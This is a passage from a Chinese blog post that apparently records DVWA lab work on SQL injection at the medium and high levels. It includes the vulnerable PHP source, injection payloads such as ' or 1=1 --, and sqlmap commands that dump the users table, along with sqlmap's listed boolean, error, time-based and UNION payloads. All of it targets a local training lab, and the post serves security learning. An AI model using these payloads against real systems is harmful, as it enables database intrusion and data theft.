+</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$number_of_rows</span> <span class=o>=</span> <span class=nx>mysqli_fetch_row</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)[</span><span class=mi>0</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>注意到两个改变：</p><ol><li><code>mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);</code>，对<code>$id</code>做了转义。</li><li><code>"SELECT first_name, last_name FROM users WHERE user_id = $id;"</code>，变成了数字型注入。</li></ol><p>按理说做了转义应该就没辙了，但还是先试试。F12从开发者工具里复制出请求，然后把<code>id</code>改成<code>0 or 1=1; --</code>，注意百分号编码而且<code>--</code>后面留一个空格。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://localhost:8080/vulnerabilities/sqli/&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;headers&#34;</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;accept&#34;</span><span class=o>:</span> <span class=s2>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;accept-language&#34;</span><span class=o>:</span> <span class=s2>&#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;cache-control&#34;</span><span class=o>:</span> <span class=s2>&#34;no-cache&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;content-type&#34;</span><span class=o>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;pragma&#34;</span><span class=o>:</span> <span class=s2>&#34;no-cache&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua&#34;</span><span class=o>:</span> <span class=s2>&#34;\&#34; Not A;Brand\&#34;;v=\&#34;99\&#34;, \&#34;Chromium\&#34;;v=\&#34;100\&#34;, \&#34;Microsoft Edge\&#34;;v=\&#34;100\&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua-mobile&#34;</span><span class=o>:</span> <span class=s2>&#34;?0&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua-platform&#34;</span><span class=o>:</span> <span class=s2>&#34;\&#34;Windows\&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-fetch-dest&#34;</span><span class=o>:</span> <span class=s2>&#34;document&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-fetch-mode&#34;</span><span class=o>:</span> <span class=s2>&#34;navigate&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-fetch-site&#34;</span><span class=o>:</span> <span class=s2>&#34;same-origin&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-fetch-user&#34;</span><span class=o>:</span> <span class=s2>&#34;?1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;upgrade-insecure-requests&#34;</span><span class=o>:</span> <span class=s2>&#34;1&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=p>},</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;referrer&#34;</span><span class=o>:</span> <span class=s2>&#34;http://localhost:8080/vulnerabilities/sqli/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;referrerPolicy&#34;</span><span class=o>:</span> <span class=s2>&#34;strict-origin-when-cross-origin&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;body&#34;</span><span class=o>:</span> <span class=s2>&#34;id=0%20or%201%3D1%3B%20--%20&amp;Submit=Submit&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;method&#34;</span><span class=o>:</span> <span class=s2>&#34;POST&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;mode&#34;</span><span class=o>:</span> <span class=s2>&#34;cors&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;credentials&#34;</span><span class=o>:</span> <span class=s2>&#34;include&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/get-start-dvwa-06/image-20220427145427860.png width=228 height=275 srcset="/p/get-start-dvwa-06/image-20220427145427860_hu5650447de8c114658782d5fa9d9f9a1a_4509_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427145427860_hu5650447de8c114658782d5fa9d9f9a1a_4509_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427145427860 class=gallery-image data-flex-grow=82 data-flex-basis=198px></p><p>好吧，这就直接成功了。到了这一步其实剩下的和 Low 难度就没区别了。</p><p>不过我对那个 <code>mysqli_real_escape_string</code> 还是很好奇，这个函数不是拿来防 SQL 注入的？查询文档如下。</p><blockquote><p>mysqli::real_escape_string &ndash; mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection</p></blockquote><p>看用例，这个<code>real_escape_string</code>会把参数转义成合法的 SQL 字符串，也就是应该会转义处理特殊字符比如<code>'</code>，但返回结果是没有<code>'</code>的，所以即使用<code>real_escape_string</code>转义后，这个参数最多是可以被安全放到<code>''</code>里，但如果不是在<code>''</code>里的话安全隐患就一点不少。</p><h3 id=high-难度>High 难度</h3><p><img src=/p/get-start-dvwa-06/image-20220427150448746.png width=493 height=355 srcset="/p/get-start-dvwa-06/image-20220427150448746_huc2b4caa9a99e052ed67febd9955e96a7_19459_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427150448746_huc2b4caa9a99e052ed67febd9955e96a7_19459_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427150448746 class=gallery-image data-flex-grow=138 data-flex-basis=333px></p><p>High难度就比较怪了，从这个窗口输入1提交之后，页面直接刷新出了id对应的用户信息，这个交互是真没见过。接着审阅下源码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_SESSION</span> <span class=p>[</span> <span class=s1>&#39;id&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// Get input
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span> <span class=s1>&#39;id&#39;</span> <span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=nv>$_DVWA</span><span class=p>[</span><span class=s1>&#39;SQLI_DB&#39;</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nx>MYSQL</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1>// Check database
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span class=si>$id</span><span class=s2>&#39; LIMIT 1;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span> <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=c1>// Get results
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>while</span><span class=p>(</span> <span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=c1>// Get values
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$first</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;first_name&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$last</span>  <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;last_name&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=c1>// Feedback for end user
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;ID: </span><span class=si>{</span><span class=nv>$id</span><span class=si>}</span><span class=s2>&lt;br /&gt;First name: </span><span class=si>{</span><span class=nv>$first</span><span class=si>}</span><span class=s2>&lt;br /&gt;Surname: </span><span class=si>{</span><span class=nv>$last</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=p>((</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])))</span> <span class=o>?</span> <span class=k>false</span> <span class=o>:</span> <span class=nv>$___mysqli_res</span><span class=p>);</span>        
+</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nx>SQLITE</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1>// 略 ...
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>立刻注意到 <code>$_SESSION['id']</code>，所以这个难度的注入点在会话信息中。此时考虑一个情况：会话保存在哪儿？Cookies 还是服务端？</p><p>如果保存在服务端，那么此处就没有注入的可能，因为无法控制<code>$_SESSION['id']</code>的值。先看一眼 Cookies 里有没有。</p><blockquote><p>事后反省：我又傻逼了。那个弹出的窗口就是让你控制 <code>$_SESSION['id']</code>的。</p><p>删除一段胡乱分析的内容。</p></blockquote><p>&mldr;.总之，先试试<code>'</code>。</p><p><img src=/p/get-start-dvwa-06/image-20220427151241418.png width=521 height=243 srcset="/p/get-start-dvwa-06/image-20220427151241418_hu9e6afd571627e65157bd0ea1c6914aae_13769_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427151241418_hu9e6afd571627e65157bd0ea1c6914aae_13769_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427151241418 class=gallery-image data-flex-grow=214 data-flex-basis=514px></p><p>很好，还是有注入的。</p><p>接着试一试 Low 难度的 payload：<code>' or 1=1 --</code>。</p><p><img src=/p/get-start-dvwa-06/image-20220427151343515.png width=408 height=325 srcset="/p/get-start-dvwa-06/image-20220427151343515_hu2769a150c5b6a4c878a2eaf3d044c857_9585_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427151343515_hu2769a150c5b6a4c878a2eaf3d044c857_9585_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427151343515 class=gallery-image data-flex-grow=125 data-flex-basis=301px></p><p>好了，我觉得不用继续了，剩下无非是把 Low 难度的 payload 重复一遍。</p><h3 id=sqlmap>sqlmap</h3><p>手工注入成功之后可以尝试下自动工具了。<code>sqlmap</code> 是一个非常著名的自动SQL注入工具，这里拿 sqlmap 玩一玩。</p><p>直接在虚拟机里安装 sqlmap <code>sudo apt install -y sqlmap</code>，然后开始。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -u <span class=s1>&#39;http://localhost/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#39;</span> --cookie <span class=s1>&#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>经过一大串输出和询问如何测试之后，得到下面的报告：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests:
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl>Parameter: id (GET)
+</span></span><span class=line><span class=cl>    Type: boolean-based blind
+</span></span><span class=line><span class=cl>    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+</span></span><span class=line><span class=cl>    Payload: id=1&#39; OR NOT 4667=4667#&amp;Submit=Submit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Type: error-based
+</span></span><span class=line><span class=cl>    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+</span></span><span class=line><span class=cl>    Payload: id=1&#39; AND EXTRACTVALUE(2744,CONCAT(0x5c,0x7170786b71,(SELECT (ELT(2744=2744,1))),0x71627a7171))-- HCVJ&amp;Submit=Submit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Type: time-based blind
+</span></span><span class=line><span class=cl>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+</span></span><span class=line><span class=cl>    Payload: id=1&#39; AND (SELECT 7426 FROM (SELECT(SLEEP(5)))bhNh)-- bKjP&amp;Submit=Submit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Type: UNION query
+</span></span><span class=line><span class=cl>    Title: MySQL UNION query (NULL) - 2 columns
+</span></span><span class=line><span class=cl>    Payload: id=1&#39; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x64687569466e4454474c614e644e7543524f49417450684b547a506d65756c54576e56466255644a,0x71627a7171)#&amp;Submit=Submit
+</span></span><span class=line><span class=cl>---
+</span></span></code></pre></td></tr></table></div></div><p><code>sqlmap</code> 发现 <code>id</code> 脆弱而且列出了三种攻击方式和对应的 payload，这里我使用的是 <code>UNION query</code>法，前面所说的稳定的1比特观察窗口就是 <code>boolean-based blind</code>，一种盲注攻击法。因为1比特的观察窗口虽然稳定但真的太小了，所以一般靠这个盲注的时候都是拿脚本跑（如上所示，比如用<code>sqlmap</code>来跑）。</p><p>更让人感到惊喜的是甚至给出了<code>id</code>可能可以用于反射型XSS，可以说非常牛逼了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>heuristic (XSS) test shows that GET parameter &#39;id&#39; might be vulnerable to cross-site scripting (XSS) attacks
+</span></span></code></pre></td></tr></table></div></div><p>通过添加参数还可以枚举出更多信息。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -u <span class=s1>&#39;http://localhost/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#39;</span> --cookie <span class=s1>&#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&#39;</span> --dbs --tables --columns
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/get-start-dvwa-06/image-20220427153558093.png width=1119 height=709 srcset="/p/get-start-dvwa-06/image-20220427153558093_hu37dcf5cebdc4dfb37dd7d8c84cf425bd_630384_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427153558093_hu37dcf5cebdc4dfb37dd7d8c84cf425bd_630384_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427153558093 class=gallery-image data-flex-grow=157 data-flex-basis=378px></p><p>一键列出表名和字段名！</p><p>然后我们直接用 sqlmap 列出 <code>dvwa.users</code> 这个表的内容。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -u <span class=s1>&#39;http://localhost/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#39;</span> --cookie <span class=s1>&#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&#39;</span> -D dvwa -T users --dump
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/get-start-dvwa-06/image-20220427153909726.png width=1371 height=439 srcset="/p/get-start-dvwa-06/image-20220427153909726_huee70106b164173b84d6e3d22dbf95277_726586_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427153909726_huee70106b164173b84d6e3d22dbf95277_726586_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427153909726 class=gallery-image data-flex-grow=312 data-flex-basis=749px></p><p>完成。之后可能再专门学一学 sqlmap 可以怎么玩，DVWA 确实是个好靶场。</p><h2 id=总结>总结</h2><p>SQL注入还算是熟悉一点，毕竟上初中那会儿就玩过了，就是那时候不懂事根本没细看。可惜了年轻的自己就是个傻逼啊。</p><p>SQL注入没什么可总结的，熟悉SQL之后DVWA这种简单的注入是信手拈来的事情，连源码都给了，注不进去才奇怪。之后研究sqlmap的时候可能再看看都有什么注入技巧，说不定也是可以迁移到其他地方的。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/security/>security</a>
+<a href=/tags/dvwa/>DVWA</a>
+<a href=/tags/sqli/>sqli</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script></article><aside class=related-contents--wrapper><h2 class=section-title>相关文章</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/p/get-start-dvwa-07/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>DVWA上手记录-SQL盲注</h2></div></a></article><article><a href=/p/sqli-labs-training-5/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>sqli-labs 实验记录 #5</h2></div></a></article><article><a href=/p/sqli-labs-training-4/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>sqli-labs 实验记录 #4</h2></div></a></article><article><a href=/p/sqli-labs-training-3/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>sqli-labs 实验记录 #3</h2></div></a></article><article><a href=/p/sqli-labs-training-2/><div class=light><div class=lamp></div></div><div class=article-details><h2 class=article-title>sqli-labs 实验记录 #2</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2021 -
+2024 weakptr's 笔记</section><section class=powerby><a href=https://beian.miit.gov.cn/>浙ICP备2021032371号-1</a>
+<span style=margin-left:16px></span>
+<a target=_blank href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33032402002231" style=display:inline-block;text-decoration:none;height:20px;line-height:20px><img src=/image/beian.png style=float:left>
+浙公网安备 33032402002231号</a><br>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计
+，由 <a href=https://nnnewb.github.io/blog/>nnnewb</a> 修改</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#前言>前言</a></li><li><a href=#原理>原理</a></li><li><a href=#解题>解题</a><ol><li><a href=#收集信息>收集信息</a></li><li><a href=#low-难度>Low 难度</a></li><li><a href=#medium-难度>Medium 难度</a></li><li><a href=#high-难度>High 难度</a></li><li><a href=#sqlmap>sqlmap</a></li></ol></li><li><a href=#总结>总结</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
